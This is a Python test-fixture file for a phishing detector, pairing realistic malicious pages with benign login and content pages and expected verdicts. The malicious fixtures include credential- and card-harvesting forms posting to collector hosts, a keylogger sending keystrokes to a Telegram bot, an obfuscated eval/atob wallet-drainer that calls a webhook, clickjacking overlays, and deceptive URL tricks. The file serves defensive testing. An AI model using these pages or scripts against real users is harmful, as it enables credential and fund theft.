"""Test fixtures: realistic attack pages and benign pages.

The benign cases exist to catch over-triggering. A phishing detector that flags
GitHub's login page is useless in practice, so those assertions matter as much
as the malicious ones.
"""

FAKE_PAYPAL = """<!doctype html><html><head><title>PayPal - Log In</title></head>
<body>
<img src="https://www.paypalobjects.com/webstatic/icon/pp258.png">
<h1>Your account has been suspended</h1>
<p>We detected unusual sign-in activity. Immediate action required — you must
verify your identity within 24 hours or your account will be closed.</p>
<form action="https://collector-endpoint.tk/harvest.php" method="post" autocomplete="off">
  <input type="email" name="login_email" placeholder="Email address">
  <input type="password" name="login_password" placeholder="Password" autocomplete="off">
  <input type="text" name="otp" maxlength="6" placeholder="Enter the 6-digit code">
  <input type="text" name="cardNumber" placeholder="Card number">
  <input type="text" name="cvv" maxlength="3" placeholder="CVV">
  <input type="hidden" name="exfil" value="dropbox-collector@mail.ru">
  <button type="submit">Log In</button>
</form>
<iframe src="https://tracker.evil.tld/beacon" width="0" height="0" style="display:none"></iframe>
<script>
document.addEventListener('contextmenu', function(e){ e.preventDefault(); return false; });
document.addEventListener('keydown', function(e){
  fetch('https://api.telegram.org/bot123:AAH/sendMessage?text=' + encodeURIComponent(e.key));
});
</script>
</body></html>"""

WALLET_DRAINER = """<!doctype html><html><head><title>MetaMask | Wallet Validation</title></head>
<body>
<h2>Connect your wallet to continue</h2>
<p>Your session has expired. Please import seed phrase to restore access.</p>
<form action="/api/submit" method="post">
  <textarea name="mnemonic" placeholder="Enter your 12-word recovery phrase"></textarea>
  <input type="text" name="privateKey" placeholder="Or paste your private key">
  <button>Validate Wallet</button>
</form>
<script>
var _0x1a = atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL2FiYyIp'.repeat(9));
eval(atob(_0x1a));
</script>
</body></html>"""

IP_LOGIN = """<!doctype html><html><head><title>Microsoft Online - Sign in</title></head><body>
<img src="https://logincdn.msauth.net/shared/logo.png">
<form action="http://185.212.44.9/collect" method="post">
  <input type="text" name="username" placeholder="someone@example.com">
  <input type="password" name="passwd">
  <button>Sign in</button>
</form></body></html>"""

CLICKJACK = """<!doctype html><html><head><title>Claim your reward</title></head><body>
<h1>You have won a $500 gift card</h1>
<p>Claim your reward now — final warning, offer expires within 48 hours.</p>
<div style="position:fixed;top:0;left:0;width:100%;height:100vh;opacity:0;z-index:99999"></div>
<iframe src="https://accounts.google.com/o/oauth2/auth" style="opacity:0;width:0;height:0"></iframe>
<a href="https://claim-now.buzz/go">https://www.google.com/rewards</a>
<a href="https://claim-now.buzz/go2">https://google.com/verify</a>
<form><input type="password" name="pwd"></form>
</body></html>"""

# ---------------------------------------------------------------- benign ---- #
REAL_GITHUB_LOGIN = """<!doctype html><html><head><title>Sign in to GitHub · GitHub</title></head>
<body>
<a href="https://github.com/">Home</a><a href="/pricing">Pricing</a>
<a href="/features">Features</a><a href="/enterprise">Enterprise</a>
<a href="https://docs.github.com">Docs</a><a href="/about">About</a>
<form action="/session" accept-charset="UTF-8" method="post">
  <input type="hidden" name="authenticity_token" value="abc123token">
  <label for="login_field">Username or email address</label>
  <input type="text" name="login" id="login_field" autocapitalize="off" autocorrect="off">
  <label for="password">Password</label>
  <input type="password" name="password" id="password">
  <input type="submit" value="Sign in">
</form>
<p>New to GitHub? <a href="/signup">Create an account</a>.</p>
<footer><a href="/site/terms">Terms</a><a href="/site/privacy">Privacy</a>
<a href="/security">Security</a><a href="https://support.github.com">Contact</a>
<p>GitHub, Inc. builds developer tools used by millions of engineers to host, review
and ship software. Our platform includes repositories, issue tracking, code review,
continuous integration, package hosting and project planning features that teams
rely on every day across open source and enterprise environments worldwide.</p>
</footer></body></html>"""

REAL_BANK = """<!doctype html><html><head><title>Chase Online - Sign in</title></head><body>
<nav><a href="/personal">Personal</a><a href="/business">Business</a>
<a href="/commercial">Commercial</a><a href="/about">About us</a></nav>
<form action="https://secure.chase.com/web/auth/dashboard" method="post">
  <input type="text" name="userId" autocomplete="username">
  <input type="password" name="password" autocomplete="current-password">
  <button>Sign in</button>
</form>
<iframe src="https://secure.chase.com/promo" width="600" height="400" title="Offers"></iframe>
<p>Chase serves millions of customers with checking and savings accounts, credit cards,
mortgages, auto loans and investment products. Visit a branch or use the mobile app to
manage your money, deposit checks, pay bills and transfer funds securely at any time.</p>
<footer><a href="/privacy">Privacy</a><a href="/terms">Terms of use</a>
<a href="/accessibility">Accessibility</a><a href="/security">Security centre</a></footer>
</body></html>"""

BLOG_PAGE = """<!doctype html><html><head><title>Understanding TLS handshakes</title></head><body>
<article><h1>Understanding TLS handshakes</h1>
<p>The TLS handshake establishes a shared secret between client and server using
asymmetric cryptography, then switches to symmetric encryption for bulk transfer.
This post walks through each flight of messages, why session resumption matters,
and how 1-RTT and 0-RTT modes in TLS 1.3 reduce latency for repeat visitors.</p>
<p>We will also look at certificate verification, OCSP stapling and the practical
performance implications of choosing particular cipher suites in production.</p>
</article>
<aside><a href="/archive">Archive</a><a href="/rss">RSS</a><a href="/about">About</a></aside>
<iframe src="https://www.youtube.com/embed/abc123" width="560" height="315"></iframe>
</body></html>"""

SEARCH_PAGE = """<!doctype html><html><head><title>Search results</title></head><body>
<form action="/search" method="get"><input type="text" name="q"><button>Search</button></form>
<ol><li><a href="https://example.com/a">Result A</a></li>
<li><a href="https://example.org/b">Result B</a></li></ol>
<p>Showing 1-10 of about 4,120,000 results for your query. Refine your search using
the filters on the left, or try different keywords to narrow the result set further.</p>
</body></html>"""

CASES = [
    # (name, url, html, expected_verdict)
    ("Fake PayPal harvester", "http://paypa1-secure.verify-account.tk/login/signin.php",
     FAKE_PAYPAL, "Dangerous"),
    ("Wallet seed drainer", "https://metamask-wallet-validate.xyz/restore",
     WALLET_DRAINER, "Dangerous"),
    ("IP-hosted MS login", "http://185.212.44.9/owa/auth/logon.aspx", IP_LOGIN, "Dangerous"),
    ("Clickjack giveaway", "https://claim-reward-now.buzz/winner", CLICKJACK, "Dangerous"),
    ("Punycode homograph", "https://xn--pypal-4ve.com/signin",
     '<html><title>PayPal</title><form action="/x"><input type="password" name="p"></form></html>',
     "Dangerous"),
    ("URL userinfo trick", "https://www.paypal.com@evil-collector.top/login", "", "Dangerous"),
    ("Deep subdomain brand", "http://login.microsoftonline.com.account-verify.secure.gq/auth",
     "", "Dangerous"),

    ("Real GitHub login", "https://github.com/login", REAL_GITHUB_LOGIN, "Safe"),
    ("Real Chase login", "https://secure.chase.com/web/auth/login", REAL_BANK, "Safe"),
    ("Technical blog", "https://example-blog.dev/posts/tls-handshakes", BLOG_PAGE, "Safe"),
    ("Search results", "https://duckduckgo.com/?q=tls+handshake", SEARCH_PAGE, "Safe"),
    ("Wikipedia article", "https://en.wikipedia.org/wiki/Phishing", BLOG_PAGE, "Safe"),
    ("Google account (real)", "https://accounts.google.com/signin/v2/identifier",
     '<html><title>Sign in - Google Accounts</title><form action="/signin/challenge">'
     '<input type="password" name="Passwd"></form></html>', "Safe"),
    ("Local dev server", "http://localhost:3000/login",
     '<html><form action="/api/login"><input type="password" name="pw"></form></html>', "Safe"),
]
